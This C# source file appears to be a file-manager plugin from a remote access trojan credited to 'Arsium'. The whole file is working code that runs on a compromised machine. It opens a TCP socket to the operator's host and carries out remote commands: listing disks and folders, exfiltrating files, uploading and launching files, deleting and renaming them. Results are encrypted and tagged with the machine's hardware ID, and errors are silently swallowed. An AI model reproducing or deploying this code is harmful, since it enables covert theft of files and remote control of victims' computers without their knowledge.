using Shared;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try
            {

                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
                Data D = new Data();
                switch (T)
                {
                    case Shared.PacketTypes.PacketType.GET_D:
                        await Task.Run(() => Functions.GetDisks(ref D));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.GET_D;
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketTypes.PacketType.GET_F:
                        Dictionary<int, List<object[]>> ListOfFilesAndDirs = await Task.Run(() => Functions.GetFilesAndDirs((string)Param[1]));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.GET_F;
                        D.DataReturn = new object[] { ListOfFilesAndDirs };
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketTypes.PacketType.DELETE_F:
                        bool deleted = await Task.Run(() => Functions.DeleteFile(Param[1].ToString()));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.DELETE_F;
                        D.DataReturn = new object[] { deleted , Param[1].ToString() };
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketTypes.PacketType.DOWNLOAD_F:
                        byte[] b = new byte[] { };
                        bool downloaded = await Task.Run(() => Functions.DownloadFile(Param[1].ToString(),ref b));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.DOWNLOAD_F;
                        D.DataReturn = new object[] { downloaded, Param[1].ToString(), b };
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketTypes.PacketType.UPLOAD_F:
                        byte[] file = (byte[])Param[2];
                        bool uploaded = await Task.Run(() => Functions.UploadFile(Param[1].ToString(), file));
                        break;

                    case PacketTypes.PacketType.LAUNCH_F:
                        bool launched = await Task.Run(() => Functions.LaunchFile(Param[1].ToString()));
                        break;

                    case PacketTypes.PacketType.RENAME_F:
                        bool renamed = await Task.Run(() => Functions.RenameFile(Param[1].ToString(), Param[2].ToString()));
                        break;

                    case Shared.PacketTypes.PacketType.SHORTCUT_DESKTOP:
                        await Task.Run(() => Functions.ShortCutFolder(Environment.SpecialFolder.Desktop ,ref D));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.SHORTCUT_DESKTOP;
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case Shared.PacketTypes.PacketType.SHORTCUT_DOCUMENTS:
                        await Task.Run(() => Functions.ShortCutFolder(Environment.SpecialFolder.MyDocuments, ref D));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.SHORTCUT_DOCUMENTS;
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketTypes.PacketType.SHORTCUT_DOWNLOADS:
                        await Task.Run(() => Functions.SpecialShortCutFolder(NativeAPI.Folder.Downloads, ref D));
                        D.HWID = HWID;
                        D.Type = Shared.PacketTypes.PacketType.SHORTCUT_DOWNLOADS;
                        D.IP_Origin = BaseIP;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                }
                S.Close();
                S.Dispose();

            }
            catch (Exception)
            {
            }
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
